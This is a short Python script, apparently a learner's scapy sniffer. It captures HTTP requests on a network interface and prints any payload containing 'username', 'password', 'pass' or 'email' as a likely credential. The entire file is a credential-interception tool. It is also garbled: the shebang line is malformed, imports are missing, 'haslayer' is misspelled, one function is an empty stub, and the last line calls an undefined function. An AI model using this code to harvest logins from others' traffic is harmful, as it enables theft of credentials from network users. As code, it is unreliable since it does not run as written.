#!/usr/bin/env as scapy
import argparse

def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-i", "--interface", dest="interface", help="Specify interface on which to sniff packets")
    arguments = parser.parse_args()
    return arguments.interface

def get_interface():...

def spoof(iface):
    scapy.sniff(iface=iface, store=False, prn=process_packet)
    
def process_packet(packet):
    if packet.haslayar(http.HTTPRequest):
        print("[+] Http Request >> " + packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path)
        if packet.haslayar(scapy.Raw):
            load = packet[scapy.Raw].load
            keys = ["username", "password", "pass", "email"]
            for key in keys:
                if key in load:
                    print("[+] Possible password/username >> " + load)
                    break
iface = get_interface()
sniff(iface)
